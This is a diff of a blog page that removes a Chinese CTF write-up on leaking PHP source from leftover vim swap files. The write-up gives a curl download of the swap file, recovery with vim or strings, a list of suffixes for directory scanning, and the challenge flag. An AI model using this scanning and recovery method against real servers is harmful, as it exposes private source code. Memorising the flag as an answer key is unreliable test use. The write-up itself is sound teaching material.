+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -5240,159 +5511,6 @@
 <p>页面几千行，翻不到很正常。<strong><code>Ctrl+F</code> 搜 <code>flag</code> 是最快的，其次是 <code>Select-String</code>。</strong></p>
 <p><strong>④ 只搜“环境变量”一个区块</strong></p>
 <p>有些题把 flag 放在 <code>PHP Variables</code> 或 <code>$_SERVER</code> 里。<strong>搜关键字比找区块快。</strong></p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-19 16:00:00+00:00">2026-11-19</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-meta__link">信息收集</a>, 
-              <a href="category/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" class="md-meta__link">源码泄露</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="ctfshow-vim"><a class="toclink" href="ctfshow-vim-swp-leak/">ctfshow — vim 临时文件泄露：服务器崩了，源码留在磁盘上</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：信息收集 — vim 交换文件（.swp）泄露源码</p>
-<p><strong>Flag</strong>：<code>ctfshow{ef6a863e-b17d-42be-b23d-56e6065f6581}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="ctfshow-vim-swp-leak/#_1">题目概述</a></h3>
-<p>题目就一句话：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了
-</span></code></pre></div>
-<p><strong>这句话不是在讲段子，是在交代“源码曾经被 vim 打开过，而且没正常退出”。</strong></p>
-<p><strong>靶场默认开 https，浏览器里删掉 <code>s</code> 换 http 有时能少踩证书的坑（这题两种都行）。</strong></p>
-<hr />
-<h3 id="_2"><a class="toclink" href="ctfshow-vim-swp-leak/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="ctfshow-vim-swp-leak/#step-1">Step 1：读懂提示</a></h4>
-<p><strong>vim 在编辑文件时不是“直接改原文件”，它会生成一个</strong>交换文件（swap file）<strong>放在同目录下。</strong></p>
-<p><strong>作用有两个：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>① 崩溃/断电后能恢复没保存的改动
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>② 防止两个人同时编辑同一个文件
-</span></code></pre></div>
-<p><strong>如果 vim 被异常终止（进程被杀、机器死机、SSH 断线），这个交换文件</strong>不会被删除<strong>，就留在 Web 目录里。</strong></p>
-<p><strong>而 Web 目录里的东西——能通过 HTTP 直接下载。</strong></p>
-<p><strong>这就是“vim 临时文件泄露”。</strong></p>
-<h4 id="step-2"><a class="toclink" href="ctfshow-vim-swp-leak/#step-2">Step 2：交换文件叫什么名字</a></h4>
-<p><strong>vim 的命名规则是：在原文件名前面加一个点，后面加 <code>.swp</code>。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>原文件      index.php
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>交换文件    .index.php.swp
-</span></code></pre></div>
-<p><strong>如果同一个文件已经被打开过多次（上一次的 swp 没清），后缀会往后排：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>.index.php.swp    第一次
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>.index.php.swo    第二次
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>.index.php.swn    第三次
-</span></code></pre></div>
-<p><strong>另外还有两种常见的“vim 残留”：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>index.php~          备份文件（backup）
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>.index.php.un~      undo 文件
-</span></code></pre></div>
-<p><strong>扫目录时把这几个后缀一起加上，命中率很高。</strong></p>
-<h4 id="step-3"><a class="toclink" href="ctfshow-vim-swp-leak/#step-3">Step 3：把文件下下来</a></h4>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-k</span> <span class="s2">"https://目标/.index.php.swp"</span> <span class="n">-o</span> <span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">swp</span>
-</span></code></pre></div>
-<p><strong>用 <code>-k</code> 是因为靶场是自签证书。</strong></p>
-<p><strong>下下来先确认是不是真的 swp：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Format-Hex</span> <span class="n">-Path</span> <span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">swp</span> <span class="n">-Count</span> <span class="n">64</span>
-</span></code></pre></div>
-<p><strong>开头应该是 <code>b0VIM</code> 这四个字节（0x62 0x30 0x56 0x49 0x4D）——这是 vim 交换文件的魔数。</strong></p>
-<h4 id="step-4-swp"><a class="toclink" href="ctfshow-vim-swp-leak/#step-4-swp">Step 4：从 swp 里把源码还原出来</a></h4>
-<p><strong>swp 是</strong>二进制<strong>文件（里面是分块保存的文本 + 元信息），</strong>不能直接 <code>cat</code> 当源码读<strong>，但文本块是明文存放的，所以有两种办法：</strong></p>
-<p><strong>① 用 vim 自己恢复（最干净）</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">vim</span> <span class="n">-r</span> <span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">swp</span>
-</span></code></pre></div>
-<p><strong>vim 会提示恢复，确认后 <code>:w index_recovered.php</code> 存出来。</strong></p>
-<p><strong>② 直接抽可打印字符串（最快）</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">strings</span> <span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">swp</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">"flag|&lt;?php|function"</span>
-</span></code></pre></div>
-<p><strong>Windows 上没有 <code>strings</code> 的话，用 Python 也行：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"index.php.swp"</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">print</span><span class="p">(</span><span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">if</span> <span class="mi">32</span> <span class="o">&lt;=</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="mi">127</span> <span class="k">else</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">))</span>
-</span></code></pre></div>
-<p><strong>两种都能看到源码——这题的 flag 就在里面：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>ctfshow{ef6a863e-b17d-42be-b23d-56e6065f6581}
-</span></code></pre></div>
-<hr />
-<table>
-<thead>
-<tr>
-<th>关键点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>触发条件</td>
-<td>vim 异常退出（死机/断连/被杀），swp 留在 Web 目录</td>
-</tr>
-<tr>
-<td>命名规则</td>
-<td><code>.原文件名.swp</code>，如 <code>.index.php.swp</code></td>
-</tr>
-<tr>
-<td>多次打开</td>
-<td>后缀顺延 <code>.swo</code> / <code>.swn</code></td>
-</tr>
-<tr>
-<td>其他残留</td>
-<td><code>index.php~</code>（备份）、<code>.index.php.un~</code>（undo）</td>
-</tr>
-<tr>
-<td>文件特征</td>
-<td>开头 <code>b0VIM</code>（魔数），二进制但文本块明文</td>
-</tr>
-<tr>
-<td>还原方式</td>
-<td><code>vim -r xxx.swp</code> 或 <code>strings</code> 抽取</td>
-</tr>
-<tr>
-<td>题目提示的作用</td>
-<td>“死机了”就是在告诉你“没正常退出 → swp 还在”</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>目录扫描时该加的后缀</summary>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>.swp  .swo  .swn  .swx  .un~  ~  .bak  .old  .orig
-</span></code></pre></div>
-<p><strong>dirsearch 里对应 <code>-e php,swp,swo,swn,bak,old,orig,txt</code>。</strong></p>
-</details>
-<details class="note">
-<summary>这题踩的坑</summary>
-<p><strong>① 文件名写成 <code>index..php.swp</code></strong></p>
-<p>多了一个点。<strong>规则是“点 + 原文件名 + .swp”，原文件名本身就带 <code>.php</code>，所以是 <code>.index.php.swp</code>。</strong></p>
-<p><strong>② 把 swp 当普通文本打开</strong></p>
-<p>它是二进制块文件，直接打开会看到一堆乱码。<strong>用 <code>vim -r</code> 恢复，或者用 <code>strings</code> 抽可打印字符。</strong></p>
-<p><strong>③ 只试了 <code>.swp</code> 没试 <code>.swo</code></strong></p>
-<p>如果那个文件被 vim 打开过两次，第一次的 swp 可能已经变成 swo。<strong>后缀要一起试。</strong></p>
-<p><strong>④ 忽略了 <code>index.php~</code></strong></p>
-<p>备份文件是纯文本，比 swp 还好读。<strong>看到 <code>~</code> 结尾的文件优先下它。</strong></p>
 </details>
     
     
